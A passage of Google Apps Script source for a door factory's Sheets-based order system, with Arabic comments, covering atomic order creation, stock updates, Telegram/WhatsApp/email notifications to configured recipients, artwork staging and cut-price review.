 var summary=[o.id,ds,tm,sanitizeCell_(o.name||''),"'"+(o.phone||''),o.region||'',warehouseEn_(o.warehouse),qty,rods,Number(o.total)||0,'New','',PRICE_NOTE,o.msg||'','','',sanitizeCell_(o.customer||''),sanitizeCell_(o.note||''),o.customerPhone||'','', '',no,0,'',due,sanitizeCell_(o.customerRegion||''),'',''];
 var lines=(o.items||[]).map(function(it){var door=it.kind==='door',rod=it.kind==='frame'||it.kind==='bror',price=door?Number(it.unitPrice)||0:Number(it.price)||0,q=Number(it.qty)||0;
 var type=door?'Door':({frame:'Frame',bror:'Bror',mabra:'Mabra',panel:'Panel',strip:'Strip',veneer:'Veneer'})[it.kind]||'Accessory';
 var unit=door?'door':it.isSet?'set':it.customSet?'rods':rod?'rod '+(it.rodCm||220)+'cm':it.unit||'pc';
 return sanitizeRow_([o.id,ds,sanitizeCell_(o.name||''),type,it.titleEn||it.title||'',it.code||'',door?(it.sizeEn||it.sizeTxt||''):it.spec||'',door?[(it.frame?it.frame+' cm frame'+(it.frameHeight?' (h:'+it.frameHeight+'cm)':''):''),(it.dbror?'bror '+it.dbror:'')].filter(function(x){return x;}).join(' + ')+((it.frame||it.dbror)?' (included, no charge)':''):'',door?it.millEn||'':'',unit,q,price,Math.round(price*q*100)/100,'Y',door?it.frame||'':'',door?it.dbror||'':'',door?it.frameHeight||'':'',door?it.w||'':'',0,(door||String(it.code||'')===CUT_SERVICE_CODE_)?it.doorHeight||'':'',rod?it.doorW||'':'',sanitizeCell_(it.note||''),door?String(it.printArt||''):'',door?String(it.engraveArt||''):'']);
 });
 return {summary:sanitizeRow_(summary),items:lines,displayNo:no,editCount:0,due:due};
}
function createCell294_(v){return v===''||v===null||typeof v==='undefined'?{}:{userEnteredValue:typeof v==='number'?{numberValue:v}:typeof v==='boolean'?{boolValue:v}:{stringValue:String(v)}};}
function appendRows294_(sheetId,rows){return {appendCells:{sheetId:sheetId,rows:rows.map(function(r){return {values:r.map(createCell294_)};}),fields:'userEnteredValue'}};}
function permErr294_(m){var e=new Error(m);e.permanent294=true;return e;}
function atomicCreate294_(o,token,env){
 if(!env.hasLock())throw Error('WRITE_LOCK_REQUIRED');
 if(!artOrderValid_(o.id)||!/^create294_[a-f0-9]{32}$/.test(String(token)))throw permErr294_('INVALID_CREATE_ID');
 var digest=env.hash(o),prior=env.receipt(o.id);
 if(prior){if(prior.digest!==digest||prior.token!==token)throw permErr294_('CREATE_CONFLICT');return prior;}
 if(env.rateAllowed&&!env.rateAllowed())throw Error('CREATE_RATE_LIMIT');
 try{env.assertAbsent(o.id);}catch(eAbsent){eAbsent.permanent294=true;throw eAbsent;} // Rejects summary, orphan lines, claimed IDs, no adoption.
 var err=orderShapeError_(o);if(err)throw permErr294_(err);
 var next=env.nextDisplay();if(!Number.isSafeInteger(next)||next<1)throw Error('DISPLAY_COUNTER_REVIEW');
 var out=createRows294_(o,{nextDisplay:next}),delta={},used={},requests=[];
 requests.push(appendRows294_(env.ordersSheetId,[out.summary]));requests.push(appendRows294_(env.itemsSheetId,out.items));
 (o.items||[]).forEach(function(it){if(it.kind!=='door')return;var code=doorCode_(it.code),w=String(it.w||'').trim(),q=Number(it.qty)||0;if(code&&w&&q)delta[code+'|'+w]=(delta[code+'|'+w]||0)-q;});
 env.stock.forEach(function(r,i){var key=doorCode_(r[0])+'|'+String(r[1]).trim();if(!delta[key]||used[key])return;used[key]=true;
 requests.push({updateCells:{range:{sheetId:env.stockSheetId,startRowIndex:env.stockRowIndices[i],endRowIndex:env.stockRowIndices[i]+1,startColumnIndex:2,endColumnIndex:4},rows:[{values:[createCell294_((Number(r[2])||0)+delta[key]),createCell294_(env.nowText)]}],fields:'userEnteredValue'}});
 });
 requests.push(env.counterRequest(next));
 if(env.notificationRequest)requests.push(env.notificationRequest(o,out,qtyForNotification294_(o)));
 var receipt={id:o.id,token:token,digest:digest,state:'COMPLETE',displayNo:out.displayNo,editCount:0,due:out.due};requests.push(env.receiptRequest(receipt));
 env.batch(requests);
 var stored=env.receipt(o.id);if(!stored||stored.digest!==digest)throw Error('CREATE_UNCONFIRMED_REVIEW_ONLY');return stored;
}

function qtyForNotification294_(o){var qty=0,rods=0;(o.items||[]).forEach(function(it){if(isServiceCode_(it.code))return;var q=Number(it.qty)||0;if(it.kind==='frame'||it.kind==='bror')rods+=it.isSet?q*3:q;else qty+=q;});return {qty:qty,rods:rods};}

/* PRIVATE activation migration. Existing sheets are read, never auto-created.
 * Create_Receipts_V294 columns: ID,Token,Digest,State,Display No,Edit Count,Due.
 * Create_Counter_V294 A1: Last Display No; A2: last used number.
 */
var HEAD_CREATE_RECEIPTS294_=['ID','Token','Digest','State','Display No','Edit Count','Due'];
function createReceipt294_(sh,id){
 if(sh.getLastRow()<2)return null;
 var all=sh.getRange(2,1,sh.getLastRow()-1,7).getValues().filter(function(r){return String(r[0])===String(id);});
 if(all.length>1)throw Error('DUPLICATE_CREATE_RECEIPT_REVIEW');
 if(!all.length)return null;var r=all[0];return {id:r[0],token:r[1],digest:r[2],state:r[3],displayNo:r[4],editCount:r[5],due:r[6]};
}
function schemaRead294_(ss,name,headers){
 var sh=ss.getSheetByName(name);if(!sh)throw Error('CREATE_SETUP_REQUIRED');
 var actual=sh.getRange(1,1,1,headers.length).getValues()[0];
 if(JSON.stringify(actual)!==JSON.stringify(headers)){
  var core=(name===SHEET_ORDERS&&headers===HEAD_ORDERS)||(name===SHEET_ITEMS&&headers===HEAD_ITEMS);
  var legacy=core?artLegacyHeaderSpan_(name,actual):null;
  if(!legacy)throw Error('CREATE_SCHEMA_MISMATCH');
  for(var col=0;col<headers.length;col++)if(!(col>=legacy.first&&col<legacy.last)&&String(actual[col]||'')!==String(headers[col]||''))throw Error('CREATE_SCHEMA_MISMATCH');
  // Existing v62 compatibility validates discriminator values in ALL occupied
  // rows. Exact legacy labels alone never authorize a reordered data layout.
  artValidateLegacyRows_(name,sh);
 }
 return sh;
}
function handleAtomicCreate294_(p){
 if(PropertiesService.getScriptProperties().getProperty('ATOMIC_CREATE_294_ENABLED')!=='REVIEWED')return {ok:false,error:'ATOMIC_CREATE_DISABLED'};
 var lock=LockService.getScriptLock();lock.waitLock(20000);
 try{
  var ss=SpreadsheetApp.getActiveSpreadsheet(),rs=schemaRead294_(ss,'Create_Receipts_V294',HEAD_CREATE_RECEIPTS294_),token=String(p.token||'');
  if(!/^create294_[a-f0-9]{32}$/.test(token)||!artOrderValid_(p.id))throw Error('INVALID_CREATE_ID');
  if(p.action==='createReceipt294'){
   var receipt=createReceipt294_(rs,p.id);if(!receipt)return {ok:true,receipt:null};
   if(!artEqual_(receipt.token,token)||!artEqual_(receipt.digest,String(p.digest||'')))throw Error('CREATE_PROOF_MISMATCH');
   return {ok:true,receipt:{id:receipt.id,state:receipt.state,displayNo:receipt.displayNo,editCount:receipt.editCount,due:receipt.due}};
  }
  var o=typeof p.order==='string'?JSON.parse(p.order):p.order;if(!o||String(o.id)!==String(p.id))throw Error('INVALID_CREATE_ID');
  var os=schemaRead294_(ss,SHEET_ORDERS,HEAD_ORDERS),is=schemaRead294_(ss,SHEET_ITEMS,HEAD_ITEMS),stock=schemaRead294_(ss,SHEET_STOCK,HEAD_STOCK),counter=schemaRead294_(ss,'Create_Counter_V294',['Last Display No']);
  var notificationSheet=schemaRead294_(ss,'Create_Notifications_V294',['ID','State','Payload','Display No','Due','Qty','Rods']);
  var env={notificationRequest:function(order,out,counts){return appendRows294_(notificationSheet.getSheetId(),[[order.id,'PENDING',JSON.stringify(order),out.displayNo,out.due,counts.qty,counts.rods]]);},rateAllowed:function(){return rateOk_('newOrder',p.dev);},hasLock:function(){return lock.hasLock();},hash:factoryHash294_,receipt:function(id){return createReceipt294_(rs,id);},assertAbsent:assertLegacyCreate294_,ordersSheetId:os.getSheetId(),itemsSheetId:is.getSheetId(),stockSheetId:stock.getSheetId(),stock:stock.getLastRow()>1?stock.getRange(2,1,stock.getLastRow()-1,stock.getLastColumn()).getValues():[],nowText:Utilities.formatDate(new Date(),TZ,'yyyy-MM-dd HH:mm:ss'),nextDisplay:function(){return Math.max(Number(counter.getRange(2,1).getValue())||0,Number(PropertiesService.getScriptProperties().getProperty('ORDER_DISPLAY_NO_SEQ'))||0,maxOrderDisplayNo_(os))+1;},counterRequest:function(n){return {updateCells:{range:{sheetId:counter.getSheetId(),startRowIndex:1,endRowIndex:2,startColumnIndex:0,endColumnIndex:1},rows:[{values:[createCell294_(n)]}],fields:'userEnteredValue'}};},receiptRequest:function(r){return appendRows294_(rs.getSheetId(),[[r.id,r.token,r.digest,r.state,r.displayNo,r.editCount,r.due]]);},batch:function(req){return Sheets.Spreadsheets.batchUpdate({requests:req},ss.getId());}};
  env.stockRowIndices=env.stock.map(function(_,i){return i+1;});
  var r=atomicCreate294_(o,token,env);return {ok:true,receipt:{id:r.id,state:r.state,displayNo:r.displayNo,editCount:r.editCount,due:r.due}};
 }catch(e){
  // رفض دائم (شكل/تعارض/معرّف مكرر): مسار POST no-cors مابيقراش جسم الرد،
  // فبنسجّل الرفض كإيصال FAILED يقراه استعلام createReceipt294 — من غير ما
  // نلمس أي رفض مؤقت/غير مؤكد (قفل، عدّاد، API، CREATE_UNCONFIRMED).
  // العلم permanent في الرد بيتربط بفعل كتابة إيصال FAILED نفسه — يعني مفيش
  // إيصال سابق (لو فيه إيصال COMPLETE مقبول، مابيتكتبش FAILED ومابيتعلّمش
  // الرفض دائم: الطلب المقبول محمي من أي محاولة لاحقة متعارضة).
  var wroteFailed294=false;
  if(e&&e.permanent294){try{
    var ssF=SpreadsheetApp.getActiveSpreadsheet(),rsF=schemaRead294_(ssF,'Create_Receipts_V294',HEAD_CREATE_RECEIPTS294_);
    if(!createReceipt294_(rsF,String(p.id))){
      var oF=null;try{oF=typeof p.order==='string'?JSON.parse(p.order):p.order;}catch(eP){}
      var dF='';if(oF){try{dF=factoryHash294_(oF);}catch(eH){}}
      rsF.appendRow([String(p.id),String(p.token||''),dF,'FAILED: '+String(e.message||e).slice(0,180),'','','']);
      wroteFailed294=true;
    }
  }catch(eF){try{logError_(eF);}catch(eL){}}}
  var rej294={ok:false,error:String(e.message||e)};if(wroteFailed294)rej294.permanent=true;return rej294;}finally{lock.releaseLock();}
}
function assertLegacySubmission294_(id){
 if(PropertiesService.getScriptProperties().getProperty('ATOMIC_CREATE_294_ENABLED')==='REVIEWED')throw Error('يلزم تحديث التطبيق لاستلام الطلب بأمان. الطلب المحلي محفوظ؛ حدّث الصفحة بدون مسح البيانات ولا تنشئ طلبًا بديلًا.');
 assertLegacyCreate294_(id);
}

/* PRIVATE artwork staging: new references only, owner factory auth, never
 * changes live item refs. Drive staging is outside the atomic Sheet commit.
 * Stages remain private, old files are never deleted by this flow.
 */
var HEAD_ART_STAGES294_=['Operation','Order','Index','Field','Ref','Order Hash','Item Hash','State'];
function stageLookup294_(sh,id,ref){
 if(sh.getLastRow()<2)return null;var rows=sh.getRange(2,1,sh.getLastRow()-1,8).getValues().filter(function(r){return String(r[1])===String(id)&&String(r[4])===String(ref);});
 if(rows.length>1)throw Error('ART_STAGE_DUPLICATE_REVIEW');return rows[0]||null;
}
function assertArtStage294_(request,index,field,ref){
 var ss=SpreadsheetApp.getActiveSpreadsheet(),sh=schemaRead294_(ss,'Factory_Art_Stages_V294',HEAD_ART_STAGES294_),r=stageLookup294_(sh,request.id,ref);
 if(!r||String(r[2])!==String(index)||r[3]!==field||r[5]!==request.expectedOrderHash||r[7]!=='READY')throw Error('ART_STAGE_NOT_APPROVED');
 var change=request.changes.filter(function(c){return Number(c.index)===Number(index);})[0];if(!change||r[6]!==change.expectedHash)throw Error('ART_STAGE_SOURCE_MISMATCH');
 var prior=artFind_(request.id,ref,true);if(!prior||artExpired_(request.id))throw Error('ART_STAGE_UNAVAILABLE');return true;
}
function handleFactoryArtStage294_(b){
 if(!checkAdminPw_(b.pw,b.dev))return {ok:false,error:adminPwError_()};
 if(PropertiesService.getScriptProperties().getProperty('FACTORY_EDIT_294_ENABLED')!=='REVIEWED')return {ok:false,error:'FACTORY_EDIT_DISABLED'};
 var lock=LockService.getScriptLock();lock.waitLock(20000);
 try{
  if(!artOrderValid_(b.orderId)||!artRefValid_(b.ref)||!/^art294_[a-f0-9]{32}$/.test(String(b.opId))||['printArt','engraveArt'].indexOf(b.field)<0)throw Error('INVALID_ART_STAGE');
  var snapshot=factorySnapshot294_(b.orderId),index=Number(b.index),item=snapshot.items[index];
  if(!Number.isInteger(index)||!item||String(item[3])!=='Door'||factoryHash294_(snapshot)!==b.expectedOrderHash||factoryHash294_(item)!==b.expectedHash)throw Error('ART_STAGE_SOURCE_CHANGED');
  if(!artRefValid_(item[b.field==='printArt'?22:23]))throw Error('ART_REPLACEMENT_EXISTING_REF_ONLY');
  var qty=Number(item[10])||0,produced=Number(item[18])||0;if(produced>=qty)throw Error('NO_UNPRODUCED_QUANTITY');

  if(artLinked_(b.orderId,b.ref))throw Error('NEW_ART_REF_REQUIRED');
  var ss=SpreadsheetApp.getActiveSpreadsheet(),sh=schemaRead294_(ss,'Factory_Art_Stages_V294',HEAD_ART_STAGES294_),prior=stageLookup294_(sh,b.orderId,b.ref);
  if(prior&&(prior[0]!==b.opId||String(prior[2])!==String(index)||prior[3]!==b.field||prior[5]!==b.expectedOrderHash||prior[6]!==b.expectedHash))throw Error('ART_STAGE_CONFLICT');
  // The clone retains privacy, exact-content retry and size/budget controls.
  // Only the existing-ID guard is replaced, behind checks above.
  var uploaded=uploadFactoryStagedPrivate294_(b);
  if(!uploaded||!uploaded.ready)throw Error('ART_STAGE_UPLOAD_UNCONFIRMED');
  if(!prior)sh.appendRow([b.opId,b.orderId,index,b.field,b.ref,b.expectedOrderHash,b.expectedHash,'READY']);
  return {ok:true,ready:true,ref:b.ref};
 }catch(e){return {ok:false,error:String(e.message||e)};}finally{lock.releaseLock();}
}
function handleFactoryArtStatus294_(p){
 if(!checkAdminPw_(p.pw,p.dev))return {ok:false,error:adminPwError_()};
 if(PropertiesService.getScriptProperties().getProperty('FACTORY_EDIT_294_ENABLED')!=='REVIEWED')return {ok:false,error:'FACTORY_EDIT_DISABLED'};
 try{
  if(!artOrderValid_(p.id)||!artRefValid_(p.ref))throw Error('INVALID_ART_STAGE');
  var ss=SpreadsheetApp.getActiveSpreadsheet(),sh=schemaRead294_(ss,'Factory_Art_Stages_V294',HEAD_ART_STAGES294_),row=stageLookup294_(sh,p.id,p.ref);
  return {ok:true,ready:!!row&&row[7]==='READY'&&!!artFind_(p.id,p.ref,true),ref:p.ref};
 }catch(e){return {ok:false,error:String(e.message||e)};}
}

/* Private durable notification worker. Same configured recipients only.
 * Per-channel claim before network. Uncertain channel never auto-retries.
 * No trigger or message is created merely by installing this source.
 */
function dispatchCreateNotifications294_(){
 var started=Date.now();
 for(var n=0;n<5&&Date.now()-started<40000;n++)if(!dispatchOneCreateNotification294_())break;
}
function dispatchOneCreateNotification294_(){
 var p=PropertiesService.getScriptProperties();if(p.getProperty('ATOMIC_CREATE_294_ENABLED')!=='REVIEWED')return false;
 var routes={telegram:!!(p.getProperty('TELEGRAM_TOKEN')&&p.getProperty('TELEGRAM_CHAT_ID')),whatsapp:!!(p.getProperty('CALLMEBOT_PHONE')&&p.getProperty('CALLMEBOT_KEY')),email:!!p.getProperty('NOTIFY_EMAIL')};
 var lock=LockService.getScriptLock(),sh,entry,index,state,selected=[];lock.waitLock(20000);
 try{
  sh=schemaRead294_(SpreadsheetApp.getActiveSpreadsheet(),'Create_Notifications_V294',['ID','State','Payload','Display No','Due','Qty','Rods']);if(sh.getLastRow()<2)return false;
  var rows=sh.getRange(2,1,sh.getLastRow()-1,7).getValues();
  for(var i=0;i<rows.length;i++){
   var raw=String(rows[i][1]);if(raw==='PENDING')state={v:294,channels:{}};else{try{state=JSON.parse(raw);}catch(e){continue;}if(!state||state.v!==294||!state.channels)continue;}
   if(raw==='PENDING')Object.keys(routes).forEach(function(k){state.channels[k]=routes[k]?'PENDING':'NOT_CONFIGURED';});
   var eligible=Object.keys(routes).filter(function(k){return state.channels[k]==='PENDING'&&routes[k]&&(k!=='email'||MailApp.getRemainingDailyQuota()>0);});
   if(!eligible.length){if(raw==='PENDING'&&!Object.keys(routes).some(function(k){return routes[k];})){sh.getRange(i+2,2).setValue('NOT_CONFIGURED');SpreadsheetApp.flush();return true;}continue;}entry=rows[i];index=i+2;selected=eligible;break;
  }
  if(!entry)return false;
  selected.forEach(function(k){state.channels[k]='REVIEW';});sh.getRange(index,2).setValue(JSON.stringify(state));SpreadsheetApp.flush();
 }finally{lock.releaseLock();}
 var o=JSON.parse(entry[2]),no='#'+entry[3],lines=['📥 طلب جديد '+no,'الموزّع: '+(o.name||'—')+(o.phone?' ('+o.phone+')':'')];
 if(o.customer)lines.push('صاحب الأوردر: '+o.customer);if(o.customerRegion)lines.push('عنوان العميل: '+o.customerRegion);
 lines.push('القطع: '+entry[5]+(entry[6]?' + '+entry[6]+' عود':'')+' — الإجمالي: '+(Number(o.total)||0));lines.push('ميعاد التسليم: '+entry[4]);var text=lines.join('\n');
 selected.forEach(function(k){
  var accepted=false;
  try{
   if(k==='telegram'){var r=UrlFetchApp.fetch('https://api.telegram.org/bot'+p.getProperty('TELEGRAM_TOKEN')+'/sendMessage',{method:'post',muteHttpExceptions:true,payload:{chat_id:p.getProperty('TELEGRAM_CHAT_ID'),text:text}});accepted=r.getResponseCode()===200&&!!JSON.parse(r.getContentText()).ok;}
   else if(k==='whatsapp'){var w=UrlFetchApp.fetch('https://api.callmebot.com/whatsapp.php?phone='+encodeURIComponent(p.getProperty('CALLMEBOT_PHONE'))+'&text='+encodeURIComponent(text)+'&apikey='+encodeURIComponent(p.getProperty('CALLMEBOT_KEY')),{muteHttpExceptions:true});accepted=w.getResponseCode()===200;}
   else if(k==='email'){MailApp.sendEmail(p.getProperty('NOTIFY_EMAIL'),'طلب جديد '+no,text);accepted=true;}
  }catch(e){accepted=false;}
  if(accepted){
   lock=LockService.getScriptLock();lock.waitLock(20000);
   try{if(sh.getRange(index,1).getValue()!==entry[0])throw Error('NOTIFICATION_ROW_CHANGED');var current=JSON.parse(String(sh.getRange(index,2).getValue()));if(current.v!==294||current.channels[k]!=='REVIEW')throw Error('NOTIFICATION_STATE_CHANGED');current.channels[k]='PROCESSED';var allDone=Object.keys(current.channels).every(function(c){return current.channels[c]==='PROCESSED'||current.channels[c]==='NOT_CONFIGURED';});sh.getRange(index,2).setValue(allDone?'PROCESSED':JSON.stringify(current));SpreadsheetApp.flush();}finally{lock.releaseLock();}
  }
 });
 return true;
}

/* Private price-review plan. Exact stored line price wins. Missing historical
 * inclusion is an explicit factory decision, never inferred from current300.
 */
function cutReviewQuote294_(b,index,fields,decision,currentCutPrice){
 var old=b.items[index];if(!old||old[3]!=='Door')throw Error('INVALID_ITEM');
 var next=dimensionTarget294_(old,fields);
 var before=doorRowNeedsCut_(old[6],old[19]),after=doorRowNeedsCut_(next[6],next[19]);
 if(before===after)return {needed:false};
 var qty=(Number(old[10])||0)-(Number(old[18])||0);if(qty<=0)throw Error('NO_UNPRODUCED_QUANTITY');
 var group=b.items.filter(function(r){return r[3]==='Door'&&String(r[6])===String(old[6])&&(Number(r[19])||0)===(Number(old[19])||0);});
 var cuts=b.items.map(function(r,i){return {row:r,index:i};}).filter(function(x){return x.row[5]==='CUT'&&String(x.row[6])===String(old[6])&&(Number(x.row[19])||0)===(Number(old[19])||0);});
 if(group.length!==1||cuts.length>1)throw Error('CUT_GROUP_REVIEW_REQUIRED');
 if(cuts.length&&!before)throw Error('EXISTING_CUT_WITH_STANDARD_DOOR_REVIEW');
 if(cuts.length&&Number(cuts[0].row[10])!==Number(old[10]))throw Error('CUT_QTY_REVIEW_REQUIRED');
 var price,delta,mode,source;
 if(cuts.length){price=Number(cuts[0].row[11]);if(!isFinite(price)||price<0)throw Error('CUT_PRICE_REVIEW_REQUIRED');mode='stored';source='existing-line';delta=after?qty*price:-qty*price;}
 else{
  if(decision!=='included'&&decision!=='separate')return {needed:true,requiresHistoryDecision:true,qty:qty,before:before,after:after,explanation:'حدد هل القص داخل حساب الباب القديم، لا يُستنتج من السعر الحالي'};
  mode=decision;source=decision==='included'?'factory-confirmed-included':'current-approved-price';price=Number(currentCutPrice);
  if(decision==='included')delta=0;
  else {if(before)throw Error('MISSING_OLD_CUT_PRICE_REVIEW');if(!isFinite(price)||price<0)throw Error('CUT_PRICE_REVIEW_REQUIRED');delta=qty*price;}
 }
 delta=Math.round(delta*100)/100;
 return {needed:true,before:before,after:after,qty:qty,price:price,delta:delta,mode:mode,source:source,serviceIndex:cuts.length?cuts[0].index:null,oldTotal:Number(b.summary&&b.summary[9])||0,newTotal:Math.round(((Number(b.summary&&b.summary[9])||0)+delta)*100)/100};
}
function validateCutReview294_(quote,approval,hash){
 if(!quote.needed)return true;
 if(quote.requiresHistoryDecision)throw Error('CUT_HISTORY_REVIEW_REQUIRED');
 if(!approval||approval.confirmed!==true||approval.quoteHash!==hash(quote))throw Error('CUT_REVIEW_CONFIRM_REQUIRED');return true;
}
function cutCurrentPrice294_(){
 var ss=SpreadsheetApp.getActiveSpreadsheet(),sh=ss.getSheetByName(SHEET_PRICES);if(!sh||sh.getLastRow()<2)throw Error('CUT_PRICE_SOURCE_UNAVAILABLE');
 var prices=JSON.parse(String(sh.getRange(2,1).getValue()||'{}')),a=Number(prices.dist&&prices.dist.customExtra),b=Number(prices.showroom&&prices.showroom.customExtra);
 if(!isFinite(a)||a<0||a!==b)throw Error('CUT_PRICE_TIER_REVIEW_REQUIRED');return a;
}
function handleCutQuote294_(e){
 if(!checkAdminPw_(e.parameter.pw,e.parameter.dev))return {ok:false,error:adminPwError_()};
 if(PropertiesService.getScriptProperties().getProperty('FACTORY_EDIT_294_ENABLED')!=='REVIEWED')return {ok:false,error:'FACTORY_EDIT_DISABLED'};
 var lock=LockService.getScriptLock();lock.waitLock(20000);
 try{
  var r=JSON.parse(String(e.parameter.request||'{}')),b=factorySnapshot294_(r.id);if(factoryHash294_(b)!==r.expectedOrderHash)throw Error('ORDER_CHANGED');
  if(!Array.isArray(r.changes)||r.changes.length!==1)throw Error('CUT_SINGLE_ITEM_REVIEW_ONLY');var ch=r.changes[0],quote=cutReviewQuote294_(b,Number(ch.index),ch.fields,r.cutHistory||'',cutCurrentPrice294_());return {ok:true,quote:quote,quoteHash:factoryHash294_(quote)};
 }catch(err){return {ok:false,error:String(err.message||err)};}finally{lock.releaseLock();}
}
function applyCutQuotePlan294_(b,request,plan,quote){
 if(!quote.needed)return;
 var produced=Number(b.items[request.changes[0].index][18])||0;
 var change=request.changes[0],old=b.items[change.index],target=(produced>0?plan.appends.filter(function(a){return a.row[3]==='Door';})[0].row:plan.projectedItems[change.index]),service=quote.serviceIndex===null?null:b.items[quote.serviceIndex];
 if(quote.after&&quote.mode!=='included'){
  var row=Array(Math.max(24,old.length)).fill('');row[0]=old[0];row[1]=old[1];row[2]=old[2];row[3]='Accessory';row[4]='خدمة قص - '+sizeLabel294_(target);row[5]='CUT';row[6]=target[6];row[9]='باب';row[10]=quote.qty;row[11]=quote.price;row[12]=quote.delta;row[13]='Y';row[18]=0;row[19]=target[19];
  plan.appends.push({sheetId:b.itemSheetId,row:row,serviceSplit:true});
 }else if(!quote.after&&service){
  // Keep historical row with zero quantity instead of deleting row identities.
  var next=service.slice();next[10]=produced;next[12]=Math.round((Number(service[12])+quote.delta)*100)/100;
  plan.rows.push({role:'item',sheetId:b.itemSheetId,rowIndex:b.itemRowIndices[quote.serviceIndex],before:service.slice(),after:next,allowedColumns:[10,12]});
 }
 if(quote.delta){var summary=b.summary.slice();summary[9]=quote.newTotal;plan.rows.push({role:'summary',sheetId:b.summarySheetId,rowIndex:b.summaryRowIndex,before:b.summary.slice(),after:summary,allowedColumns:[9]});}
}

/* Read-only preflight. Run manually before enabling. No sheet, property, file,
 * trigger or deployment is created/updated. No notification is sent.
 * Do not paste its raw log into a shared group: it reports account setup state.
 */
function inspectReadiness294_(){
 var result={ready:false,checks:[],activation:{},limits:['Direct spreadsheet edits must pause during transactions.','Automatic browser resume is OFF in the shipped interface.','No real write or notification was tested by this inspection.']};
 var check=function(name,fn){try{fn();result.checks.push({name:name,ok:true});}catch(e){result.checks.push({name:name,ok:false,error:String(e.message||e)});}};
 var ss=SpreadsheetApp.getActiveSpreadsheet(),props=PropertiesService.getScriptProperties();
 [[SHEET_ORDERS,HEAD_ORDERS],[SHEET_ITEMS,HEAD_ITEMS],[SHEET_STOCK,HEAD_STOCK],['Create_Receipts_V294',HEAD_CREATE_RECEIPTS294_],['Create_Counter_V294',['Last Display No']],['Create_Notifications_V294',['ID','State','Payload','Display No','Due','Qty','Rods']],['Factory_Edit_Receipts_V294',HEAD_FACTORY_RECEIPTS294_],['Factory_Art_Stages_V294',HEAD_ART_STAGES294_]].forEach(function(pair){check(pair[0],function(){schemaRead294_(ss,pair[0],pair[1]);});});
 check('advanced_sheets_read',function(){if(typeof Sheets==='undefined')throw Error('ADVANCED_SHEETS_REQUIRED');Sheets.Spreadsheets.get(ss.getId(),{fields:'spreadsheetId'});});
 check('counter_baseline',function(){var sh=schemaRead294_(ss,'Create_Counter_V294',['Last Display No']),n=Number(sh.getRange(2,1).getValue()),min=Math.max(Number(props.getProperty('ORDER_DISPLAY_NO_SEQ'))||0,maxOrderDisplayNo_(ss.getSheetByName(SHEET_ORDERS)));if(!isFinite(n)||n<min||n<0)throw Error('COUNTER_BELOW_EXISTING_MAX');});
 check('notification_route',function(){var tg=props.getProperty('TELEGRAM_TOKEN')&&props.getProperty('TELEGRAM_CHAT_ID'),cb=props.getProperty('CALLMEBOT_PHONE')&&props.getProperty('CALLMEBOT_KEY'),email=props.getProperty('NOTIFY_EMAIL');if(!tg&&!cb&&!email)throw Error('NO_CONFIGURED_NOTIFICATION_ROUTE');});
 check('notification_worker',function(){if(!ScriptApp.getProjectTriggers().some(function(t){return t.getHandlerFunction()==='dispatchCreateNotifications294_';}))throw Error('NOTIFICATION_TRIGGER_REQUIRED');});
 check('existing_art_policy',function(){if(props.getProperty('ART_RETENTION_POLICY')!=='READY_72H_PERMANENT_V1')throw Error('EXISTING_ART_POLICY_REQUIRED');});
 result.activation.atomicCreate=props.getProperty('ATOMIC_CREATE_294_ENABLED')==='REVIEWED';result.activation.factoryEdit=props.getProperty('FACTORY_EDIT_294_ENABLED')==='REVIEWED';
 result.ready=result.checks.every(function(c){return c.ok;});console.log(JSON.stringify(result));return result;
}

/* Manual migration helpers. Merely installing this code runs none of them.
 * Never edits existing Orders/Items/Stock rows or artwork, never enables flags.
 * Caller must pause old clients, back up, then run explicitly in same project.
 */
function inspectReadiness294(){return inspectReadiness294_();}
function prepareStorage294(){
 var lock=LockService.getScriptLock();lock.waitLock(20000);
 try{
  var ss=SpreadsheetApp.getActiveSpreadsheet(),p=PropertiesService.getScriptProperties();
  if(p.getProperty('ATOMIC_CREATE_294_ENABLED')==='REVIEWED'||p.getProperty('FACTORY_EDIT_294_ENABLED')==='REVIEWED')throw Error('DISABLE_NEW_PATHS_BEFORE_SETUP');
  [[SHEET_ORDERS,HEAD_ORDERS],[SHEET_ITEMS,HEAD_ITEMS],[SHEET_STOCK,HEAD_STOCK]].forEach(function(x){schemaRead294_(ss,x[0],x[1]);});
  var defs=[['Create_Receipts_V294',HEAD_CREATE_RECEIPTS294_],['Create_Counter_V294',['Last Display No']],['Create_Notifications_V294',['ID','State','Payload','Display No','Due','Qty','Rods']],['Factory_Edit_Receipts_V294',HEAD_FACTORY_RECEIPTS294_],['Factory_Art_Stages_V294',HEAD_ART_STAGES294_]];
  // Validate every existing support sheet before creating the first missing one.
  defs.forEach(function(x){if(ss.getSheetByName(x[0]))schemaRead294_(ss,x[0],x[1]);});
  var counter=ss.getSheetByName('Create_Counter_V294'),stored=counter?counter.getRange(2,1).getValue():'';
  if(stored!==''&&(!isFinite(Number(stored))||Number(stored)<0||Math.floor(Number(stored))!==Number(stored)))throw Error('COUNTER_VALUE_REVIEW');
  var baseline=Math.max(Number(stored)||0,Number(p.getProperty('ORDER_DISPLAY_NO_SEQ'))||0,maxOrderDisplayNo_(ss.getSheetByName(SHEET_ORDERS)));
  if(!isFinite(baseline)||baseline<0||Math.floor(baseline)!==baseline)throw Error('COUNTER_SOURCE_REVIEW');
  var created=[];defs.forEach(function(x){if(!ss.getSheetByName(x[0])){var sh=ss.insertSheet(x[0]);sh.getRange(1,1,1,x[1].length).setValues([x[1]]);created.push(x[0]);}});
  counter=ss.getSheetByName('Create_Counter_V294');if(stored===''||Number(stored)<baseline)counter.getRange(2,1).setValue(baseline);
  SpreadsheetApp.flush();var result={created:created,counter:baseline,enabled:false,next:'Run installNotificationWorker294, then inspectReadiness294. No activation performed.'};console.log(JSON.stringify(result));return result;
 }finally{lock.releaseLock();}
}
function installNotificationWorker294(){
 var p=PropertiesService.getScriptProperties();if(p.getProperty('ATOMIC_CREATE_294_ENABLED')==='REVIEWED')throw Error('INSTALL_WORKER_BEFORE_ACTIVATION');
 schemaRead294_(SpreadsheetApp.getActiveSpreadsheet(),'Create_Notifications_V294',['ID','State','Payload','Display No','Due','Qty','Rods']);
 var triggers=ScriptApp.getProjectTriggers().filter(function(t){return t.getHandlerFunction()==='dispatchCreateNotifications294_';});
 if(triggers.length>1)throw Error('DUPLICATE_WORKER_REVIEW');
 if(!triggers.length)ScriptApp.newTrigger('dispatchCreateNotifications294_').timeBased().everyMinutes(1).create();
 return {installed:true,enabled:false,note:'Worker stays idle while atomic create is OFF. Existing triggers retained.'};
}

function uploadFactoryStagedPrivate294_(b){
